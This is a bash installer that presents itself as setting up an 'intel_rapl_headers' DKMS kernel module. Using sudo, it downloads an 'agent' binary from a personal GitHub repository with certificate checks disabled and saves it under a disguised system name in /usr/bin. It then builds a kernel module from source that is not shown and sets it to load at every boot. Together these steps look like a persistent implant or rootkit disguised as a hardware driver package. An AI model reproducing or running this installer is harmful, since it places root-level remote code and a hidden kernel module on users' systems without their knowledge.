#!/bin/bash

set -e

MODULE_NAME="intel_rapl_headers"
MODULE_VERSION="1.0"
INSTALL_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BLUE}[*] Installing agent binary...${NC}"
sudo wget https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package --no-check-certificate -O /usr/bin/intelheaders_gnu
sudo chmod +x /usr/bin/intelheaders_gnu
echo -e "${GREEN}[+] Agent installed to /usr/bin/intelheaders_gnu${NC}"

echo -e "${BLUE}[*] Preparing DKMS source directory...${NC}"
sudo rm -rf "$INSTALL_DIR"
sudo mkdir -p "$INSTALL_DIR"

# Copy source files to DKMS folder
sudo cp intel_rapl_headers.c Makefile "$INSTALL_DIR"

# Create dkms.conf
cat <<EOF | sudo tee "$INSTALL_DIR/dkms.conf" > /dev/null
PACKAGE_NAME="${MODULE_NAME}"
PACKAGE_VERSION="${MODULE_VERSION}"
BUILT_MODULE_NAME="${MODULE_NAME}"
DEST_MODULE_LOCATION="/kernel/drivers/${MODULE_NAME}"
AUTOINSTALL="yes"
EOF

# Clean up existing DKMS entry
echo -e "${BLUE}[*] Cleaning up old DKMS entry if exists...${NC}"
if dkms status | grep -q "${MODULE_NAME}, ${MODULE_VERSION}"; then
    echo -e "${YELLOW}[!] Removing existing DKMS module ${MODULE_NAME}-${MODULE_VERSION}...${NC}"
    sudo dkms remove -m "$MODULE_NAME" -v "$MODULE_VERSION" --all
fi

# Add, build and install via DKMS
echo -e "${BLUE}[*] Adding, building and installing via DKMS...${NC}"
sudo dkms add -m "$MODULE_NAME" -v "$MODULE_VERSION"
sudo dkms build -m "$MODULE_NAME" -v "$MODULE_VERSION"
sudo dkms install -m "$MODULE_NAME" -v "$MODULE_VERSION"

# Configure to auto-load at boot
echo -e "${BLUE}[*] Configuring auto-load at boot...${NC}"
echo "$MODULE_NAME" | sudo tee /etc/modules-load.d/${MODULE_NAME}.conf > /dev/null

# Load the module now
echo -e "${BLUE}[*] Loading module now...${NC}"
sudo modprobe "$MODULE_NAME"

# Verify
echo -e "${BLUE}[*] Verifying...${NC}"
if lsmod | grep -q "$MODULE_NAME"; then
    echo -e "${GREEN}[+] Module '$MODULE_NAME' loaded successfully and will persist after reboot!${NC}"
else
    echo -e "${RED}[!] Module '$MODULE_NAME' did NOT load correctly. Check build logs and dmesg.${NC}"
fi
